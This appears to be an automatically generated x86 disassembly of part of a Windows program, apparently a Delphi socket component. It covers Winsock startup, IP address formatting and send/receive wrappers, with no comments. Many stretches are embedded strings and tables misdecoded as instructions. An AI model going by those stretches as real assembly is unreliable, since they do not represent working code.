add [ eax - 0x57ffbfd6 ] ch
sub al [ eax ]
test al 0x2a
inc eax
add [ eax - 0x57ffbfd6 ] ch
sub al [ eax ]
test al 0x2a
inc eax
add [ eax - 0x57ffbfd6 ] ch
sub al [ eax ]
test al 0x2a
inc eax
add [ eax - 0x57ffbfd6 ] ch
sub al [ eax ]
test al 0x2a
inc eax
add [ eax - 0x57ffbfd6 ] ch
sub al [ eax ]
test al 0x2a
inc eax
add [ eax - 0x57ffbfd6 ] ch
sub al [ eax ]
test al 0x2a
inc eax
add [ eax - 0x57ffbfd6 ] ch
sub al [ eax ]
mov [ eax ] ds
inc esi
add [ eax - 0x57ffbfd6 ] ch
sub al [ eax ]
test al 0x2a
inc eax
add [ eax - 0x57ffbfd6 ] ch
sub al [ eax ]
test al 0x2a
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x80040 ] dl
add [ eax ] al
or [ ecx + ecx * 2 + 0x64 ] dl
push ebx
je r-xdata
imul esi [ ebx + 0x74 ] 0x14fcc08b
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4615 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x10004615 ] dl
add [ eax ] al
add [ eax - 0x17ffbff0 ] ah
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
pushfd
sbb eax 0x2aa80046
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edx + 0x46 ] al
add [ eax + eax ] cl
add [ eax ] al
pushfd
adc eax 0x34e80046
inc eax
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
sbb al 0x45
dec ecx
push ebx
je r-xdata
arpl [ ebx - 0x70 ] bp
call sub_465bb6
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
adc eax 0xc0046
add [ eax ] al
nop
xor al [ eax ]
pop ss
inc ebp
dec ecx
push ebx
je r-xdata
arpl [ ebx + 0x49 ] bp
outsb
imul esi [ ecx + ebp * 2 + 0x61 ] 0x617a696c
je r-xdata
retn 0x4
arpl [ ebx + 0x53 ] bp
je r-xdata
arpl [ ebp + 0x65 ] sp
push 0xffffffff
outsd
outsb
inc esi
popad
imul ebp [ ebp + 0x64 ] 0xb000408d
push ss
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004616 ] dh
add [ eax ] al
add [ ebp + edx + 0x34e80046 ] bl
inc eax
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
add [ eax ] al
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
lea ecx [ esp + 0x4 ]
call sub_4616d4
retn
imul edi [ edx + 0x65 ] 0x65637845
push 0xffffffff
sub_4616d4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi eax
xor ebx ebx
inc edx
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x6c ]
mov [ esi + 0x4 ] eax
mov edx [ ebp + 0x8 ]
test edx edx
jl r-xdata
mov edx [ esi + 0x4 ]
mov eax esi
call sub_461788
inc edx
mov eax edi
add eax 0x4
dec edx
jne r-xdata
mov bl 0x1
jmp r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax ]
jne r-xdata
sub_46171c
push ebp
mov ebp esp
push 0x0
push ebx
xor ebx ebx
push ebp
push sub_46177b
push [ fs : ebx ]
mov [ fs : ebx ] esp
push ecx
mov ecx 0x2
xchg edx ecx
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461782
lea eax [ ebp - 0x4 ]
call sub_404074
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
sub_461788
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4617da
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x68 ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_45ffac
call sub_403a2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4617e1
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_461814
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx r-xdata
mov eax ebx
call sub_407f14
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_461cc0
test al al
je r-xdata
mov eax edi
mov edx r-xdata
call sub_4040c8
jmp r-xdata
mov ecx edi
mov edx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov eax edi
mov edx ebx
call sub_4040c8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_46188c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov esi edx
xor eax eax
push ebp
push sub_461c86
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404074
mov eax esi
add eax 0xffffd8ec
cmp eax 0x3e
ja r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ba4
mov eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0x0
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
pop eax
call sub_408dbc
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4040c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461c8d
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404098
retn
jmp [ eax * 4 + jump_table_4618cc ]
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
sub_461c94
push ebx
mov ebx eax
or edx 0xffffffff
mov eax ebx
call sub_4081c4
inc eax
jle r-xdata
xor eax eax
pop ebx
retn
mov edx 0x100
mov eax ebx
call sub_4081c4
cmp eax 0x100
jl r-xdata
mov al 0x1
pop ebx
retn
sub_461cc0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_404524
xor eax eax
push ebp
push sub_461d7f
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463368
push 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463368
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463368
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_40410c
mov eax [ ebp - 0x8 ]
call sub_461c94
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_461c94
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461d86
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_404098
retn
mov eax [ ebp - 0x10 ]
call sub_461c94
test al al
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_461c94
test al al
jne r-xdata
mov bl 0x1
sub_461d9c
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_4032a0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403290
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_461dcc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404524
xor eax eax
push ebp
push sub_461e14
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x80 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461e1b
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_461e24
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_461e49
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461e50
retn
sub_461e60
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x800461e
add [ eax ] eax
add [ esp + edx + 0x46 ] al
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
mov ah 0x2d
inc esi
add [ ebp + ebp + 0x46 ] cl
add [ esi + ebp ] bl
inc esi
add [ eax + 0x1400462d ] dh
push esp
dec ecx
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
je r-xdata
imul esi [ ebx + 0x74 ] 0x646e6957
outsd
ja r-xdata
inc esi
add [ edx + 0x23500046 ] ah
inc esi
add [ eax ] al
and eax [ esi ]
push eax
daa
inc esi
add [ eax + 0x29 ] bh
inc esi
add [ eax ] ah
sub al [ esi ]
inc esi
add [ eax + 0x28 ] bl
inc esi
add [ eax ] bh
daa
inc esi
add [ ebx + 0x27440046 ] cl
inc esi
add [ eax + 0x29 ] ah
inc esi
add [ ecx + ebp + 0x46 ] ch
add [ eax - 0x4bffb9dd ] bl
and eax [ esi ]
xor [ 0x26480046 ] ah
inc esi
add [ esi + 0x46 ] ah
add al dl
inc esi
add [ eax ] ah
daa
inc esi
add al ah
sub eax [ esi ]
push eax
inc esi
add [ edi ] dl
inc esi
add ah ch
sub eax [ esi ]
mov [ esi + eax * 2 ] gs
add [ ebp + 0x209c0046 ] ch
inc esi
add [ ebx + ebp ] al
inc esi
add [ edi ] cl
push esp
dec ecx
push ebx
je r-xdata
push eax
and eax [ esi ]
add [ ebx ] ah
inc esi
add [ eax + 0x27 ] dl
lea eax [ eax ]
sbb al 0x1f
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1000461f ] ah
add [ eax ] al
add [ eax - 0x17ffb9ec ] dh
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
xchg ebp eax
insb
arpl [ ebx + 0x57 ] bp
imul ebp [ esi + 0x64 ] 0x5573776f
mov ebp esp
add esp 0xfffffe6c
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x194 ] ecx
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_46204e
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_4617e8
cmp [ rw-data ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_4035c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462055
lea eax [ ebp - 0x194 ]
call sub_404074
retn
lea eax [ ebp - 0x18e ]
push eax
push 0x202
call sub_4612b8
inc eax
jne r-xdata
mov [ rw-data ] 0x1
lea edx [ ebp - 0x194 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x194 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
sub_461f25
inc esi
add [ eax + 0x4c00461f ] dh
and [ esi ] eax
fsub [ ecx ]
inc esi
add [ eax + 0x22 ] cl
inc esi
add [ edx + 0x46 ] dl
add [ edx + 0x23500046 ] ah
inc esi
add [ eax ] al
and eax [ esi ]
push eax
daa
inc esi
add [ eax + 0x28 ] bl
inc esi
add [ eax ] bh
daa
inc esi
add [ ebx + 0x27440046 ] cl
inc esi
add [ eax + 0x29 ] ah
inc esi
add [ ecx + ebp + 0x46 ] ch
add [ eax - 0x4bffb9dd ] bl
and eax [ esi ]
xor [ 0x26480046 ] ah
inc esi
add [ esi + 0x46 ] ah
add al dl
inc esi
add [ eax ] ah
daa
inc esi
add al ah
sub eax [ esi ]
push eax
inc esi
add [ edi ] dl
inc esi
add ah ch
sub eax [ esi ]
mov [ esi + eax * 2 ] gs
add [ ebp + 0x209c0046 ] ch
inc esi
add [ ebx + ebp ] al
inc esi
add [ edi ] cl
push esp
dec ecx
push ebx
je r-xdata
xchg ebp eax
insb
arpl [ ebx + 0x57 ] bp
imul ebp [ esi + 0x64 ] 0x5573776f
mov ebp esp
add esp 0xfffffe6c
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x194 ] ecx
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_46204e
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_4617e8
cmp [ rw-data ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_4035c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462055
lea eax [ ebp - 0x194 ]
call sub_404074
retn
lea eax [ ebp - 0x18e ]
push eax
push 0x202
call sub_4612b8
inc eax
jne r-xdata
mov [ rw-data ] 0x1
lea edx [ ebp - 0x194 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x194 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
sub_462074
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_461d9c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_46209c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_462130
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov al [ ebx ]
lea edx [ ebp - 0x4 ]
call sub_40804c
push [ ebp - 0x4 ]
push r-xdata
xor eax eax
mov al [ ebx + 0x1 ]
lea edx [ ebp - 0x8 ]
call sub_40804c
push [ ebp - 0x8 ]
push r-xdata
xor eax eax
mov al [ ebx + 0x2 ]
lea edx [ ebp - 0xc ]
call sub_40804c
push [ ebp - 0xc ]
push r-xdata
xor eax eax
mov al [ ebx + 0x3 ]
lea edx [ ebp - 0x10 ]
call sub_40804c
push [ ebp - 0x10 ]
mov eax esi
mov edx 0x7
call sub_4043f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462137
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404098
retn
sub_462143
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_4621cb
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x10
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4040c8
mov ax [ ebp - 0x16 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4621d2
lea eax [ ebp - 0x1c ]
call sub_404074
retn
sub_4621dc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov ax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] ax
mov eax esi
call sub_404334
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_461dcc
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x12 ] ax
push 0x10
lea eax [ ebp - 0x14 ]
push eax
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_462254
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebp - 0x10 ] cx
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_461dcc
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0xe ] ax
push 0x10
lea eax [ ebp - 0x10 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4622a4
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax edi
call sub_404534
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov dl [ eax ]
mov [ esp ] dl
mov dl [ eax + 0x1 ]
mov [ esp + 0x1 ] dl
mov dl [ eax + 0x2 ]
mov [ esp + 0x2 ] dl
mov al [ eax + 0x3 ]
mov [ esp + 0x3 ] al
mov ecx esi
mov edx esp
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
or edx 0xffffffff
mov eax ebx
call sub_4616c8
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_462300
push ebx
push esi
push edi
push ecx
mov edi ecx
mov ebx edx
mov esi eax
mov eax ebx
call sub_404534
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esp ] eax
push 0x2
push 0x4
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
test ebx ebx
jne r-xdata
mov eax edi
mov edx [ ebx ]
call sub_40426c
or edx 0xffffffff
mov eax esi
call sub_4616c8
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_462350
push ebx
mov ebx edx
mov eax ebx
mov edx 0xfa
call sub_4046c0
mov eax [ ebx ]
call sub_404334
push eax
mov eax [ ebx ]
call sub_404534
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebx ]
call sub_404534
mov edx eax
mov eax ebx
call sub_40426c
pop ebx
retn
sub_462398
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x8
sub_4623b4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_46243f
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x10
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp + 0xc ]
call sub_4040c8
mov ax [ ebp - 0x16 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462446
lea eax [ ebp - 0x1c ]
call sub_404074
retn
sub_462450
push ebx
push esi
push edi
mov ebx edx
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx [ eax ]
call [ edx + 0x8 ]
mov edx [ ebx ]
mov eax edi
call sub_413fa0
mov esi [ ebx ]
dec esi
test esi esi
jl r-xdata
inc esi
lea eax [ ebx + 0x4 ]
mov ebx eax
mov edx [ ebx ]
mov eax edi
call sub_413c88
add ebx 0x4
dec esi
jne r-xdata
sub_46248c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_462521
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462528
lea eax [ ebp - 0xc ]
call sub_404074
retn
cmp [ edi + 0x8 ] 0x40
jle r-xdata
mov esi [ edi + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
mov eax [ edi + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
inc esi
mov [ ebp - 0x8 ] 0x0
mov ebx [ ebp - 0x4 ]
add ebx 0x4
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_413de4
mov [ ebx ] eax
inc [ ebp - 0x8 ]
add ebx 0x4
dec esi
jne r-xdata
sub_462530
push ebp
mov ebp esp
add esp 0xfffffcec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
lea eax [ ebp - 0x10c ]
xor ecx ecx
mov edx 0x104
call sub_402cbc
lea eax [ ebp - 0x210 ]
xor ecx ecx
mov edx 0x104
call sub_402cbc
lea eax [ ebp - 0x314 ]
xor ecx ecx
mov edx 0x104
call sub_402cbc
lea edx [ ebp - 0x10c ]
mov eax esi
call sub_46248c
lea edx [ ebp - 0x210 ]
mov eax edi
call sub_46248c
lea edx [ ebp - 0x314 ]
mov eax [ ebp + 0xc ]
call sub_46248c
cmp ebx 0xfffffffe
jne r-xdata
mov eax ebx
mov ecx 0x3e8
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax ebx
mov ecx 0x3e8
cdq
idiv ecx
imul eax edx 0x3e8
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
push 0x0
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
lea edx [ ebp - 0x10c ]
mov eax esi
call sub_462450
lea edx [ ebp - 0x210 ]
mov eax edi
call sub_462450
lea edx [ ebp - 0x314 ]
mov eax [ ebp + 0xc ]
call sub_462450
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_462648
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x8
sub_462664
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
xor ecx ecx
mov edx 0x10
call sub_402cbc
mov [ ebp - 0x10 ] 0x2
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_461dcc
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0xe ] ax
push 0x10
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push edi
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_4626d0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
